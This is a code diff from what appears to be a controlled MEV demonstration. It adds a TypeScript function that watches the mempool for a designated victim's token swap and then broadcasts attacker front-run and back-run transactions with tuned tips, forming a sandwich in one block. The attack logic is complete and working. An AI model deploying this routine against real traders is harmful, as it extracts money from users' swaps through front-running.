@@ -97,6 +97,126 @@ export async function buildVictimSwapRequest(
   };
 }
 
+export interface MempoolWatch {
+  id: string;
+  /** Unsigned victim swap the victim broadcasts THEMSELVES (normal wallet send). */
+  swap: { to: string; valueWei: string; data: string; suggestedTipGwei: string };
+  status(): { done: boolean; seenVictim: boolean; outcome?: TrioOutcome };
+  promise: Promise<TrioOutcome>;
+}
+
+/**
+ * Desktop browser wallets (MetaMask extension) no longer support
+ * eth_signTransaction, so the judge cannot hand over a pre-signed raw victim
+ * tx. Instead the victim broadcasts their OWN swap with a 12.01 gwei tip while
+ * this watcher polls the mempool (pending block); the moment the victim tx is
+ * seen, attacker front (12.02 tip) and back (12.00 tip) are broadcast —
+ * builders order by tip: [front][victim][back], same block, identical
+ * mechanics to the golden run. If the block closes before the attacker lands,
+ * the attempt reports failure honestly (receipts read back, never fabricated).
+ */
+export function startMempoolSandwich(
+  provider: ethers.Provider & { send: (m: string, p: unknown[]) => Promise<unknown> },
+  attackerWallet: ethers.Wallet,
+  victimAddress: string,
+  opts: { pair?: string; mevTestToken?: string; timeoutMs?: number; say?: (m: string) => void } = {},
+): MempoolWatch {
+  const say = opts.say ?? log;
+  const art = loadArtifacts();
+  const tokenAddr = opts.mevTestToken ?? art.mevTestToken!;
+  const pairAddr = opts.pair ?? art.pair!;
+  if (!tokenAddr || !pairAddr) throw new Error("Run setup-pool.ts first");
+
+  let seenVictim = false;
+  let outcome: TrioOutcome | undefined;
+
+  const watch: MempoolWatch = {
+    id: crypto.randomUUID(),
+    swap: { to: "", valueWei: "0", data: "", suggestedTipGwei: "12.01" },
+    status: () => ({ done: !!outcome, seenVictim, outcome }),
+    promise: (async () => {
+      const router = new ethers.Contract(ROUTER, ROUTER_ABI, attackerWallet);
+      const chainId = (await provider.getNetwork()).chainId;
+      const plan = await planAttempt(provider, pairAddr, tokenAddr);
+      if (plan.predictedLossBps < 100n || plan.predictedLossBps > 1200n) {
+        throw new Error(`predicted loss ${(Number(plan.predictedLossBps) / 100).toFixed(2)}% outside safety band`);
+      }
+      watch.swap = await buildVictimSwapRequest(victimAddress, tokenAddr);
+      const dataMatch = watch.swap.data.toLowerCase();
+
+      const latest = await retry("getBlock", () => provider.getBlock("latest"));
+      const baseFee = latest?.baseFeePerGas ?? ethers.parseUnits("15", "gwei");
+      const fees = (tip: bigint) => ({
+        maxPriorityFeePerGas: tip,
+        maxFeePerGas: baseFee * 2n + tip,
+        gasLimit: GAS_SWAP,
+        type: 2 as const,
+        chainId,
+      });
+
+      const deadline = Date.now() + (opts.timeoutMs ?? 180_000);
+      say(`[watch ${watch.id.slice(0, 8)}] watching mempool for victim swap from ${victimAddress}...`);
+      let victimHash = "";
+      while (Date.now() < deadline && !victimHash) {
+        await new Promise((r) => setTimeout(r, 1500));
+        const pending: any = await provider.send("eth_getBlockByNumber", ["pending", true]);
+        for (const tx of pending?.transactions ?? []) {
+          if (
+            String(tx.from).toLowerCase() === victimAddress.toLowerCase() &&
+            String(tx.input).toLowerCase() === dataMatch
+          ) {
+            victimHash = tx.hash;
+            seenVictim = true;
+            say(`[watch] victim tx spotted in mempool: ${victimHash}`);
+            break;
+          }
+        }
+      }
+      if (!victimHash) {
+        outcome = { ok: false, reason: "victim swap not seen in mempool before timeout" };
+        return outcome;
+      }
+
+      const nonceA = await attackerWallet.getNonce();
+      const popFront = await router.swapExactETHForTokensSupportingFeeOnTransferTokens.populateTransaction(
+        0, [WETH, tokenAddr], attackerWallet.address, Math.floor(Date.now() / 1000) + 120, {},
+      );
+      const popBack = await router.swapExactTokensForETHSupportingFeeOnTransferTokens.populateTransaction(
+        plan.backSellAmount, 0, [tokenAddr, WETH], attackerWallet.address, Math.floor(Date.now() / 1000) + 120, {},
+      );
+      const rawFront = await attackerWallet.signTransaction({ ...popFront, value: FRONT_WETH, nonce: nonceA, ...fees(ethers.parseUnits("12.02", "gwei")) });
+      const rawBack = await attackerWallet.signTransaction({ ...popBack, value: 0n, nonce: nonceA + 1, ...fees(ethers.parseUnits("12.00", "gwei")) });
+
+      const frontHash = (await provider.send("eth_sendRawTransaction", [rawFront])) as string;
+      const backHash = (await provider.send("eth_sendRawTransaction", [rawBack])) as string;
+      say(`[watch] broadcast front=${frontHash.slice(0, 14)}… back=${backHash.slice(0, 14)}…`);
+
+      const receipts = await Promise.all([
+        provider.waitForTransaction(frontHash, 1, 90_000),
+        provider.waitForTransaction(victimHash, 1, 90_000),
+        provider.waitForTransaction(backHash, 1, 90_000),
+      ]);
+      const [rcf, rcv, rcb] = receipts;
+      if (!rcf || !rcv || !rcb) {
+        outcome = { ok: false, reason: "receipt timeout", frontHash, victimHash, backHash };
+        return outcome;
+      }
+      const sameBlock = rcf.blockNumber === rcv.blockNumber && rcv.blockNumber === rcb.blockNumber;
+      const ordered = rcf.index < rcv.index && rcv.index < rcb.index;
+      outcome = sameBlock && ordered && rcf.status === 1 && rcv.status === 1 && rcb.status === 1
+        ? { ok: true, block: rcf.blockNumber, frontHash: rcf.hash, victimHash: rcv.hash, backHash: rcb.hash }
+        : {
+            ok: false,
+            reason: `statuses=${[rcf.status, rcv.status, rcb.status].join(",")} ${sameBlock ? (ordered ? "" : "wrong order") : "split blocks"}`,
+            frontHash: rcf.hash, victimHash: rcv.hash, backHash: rcb.hash, block: rcf.blockNumber,
+          };
+      say(`[watch] outcome: ${JSON.stringify(outcome)}`);
+      return outcome;
+    })(),
+  };
+  return watch;
+}
+
 function waitForNewBlock(provider: ethers.Provider): Promise<void> {
   return new Promise<void>((res) => {
     const h = () => {
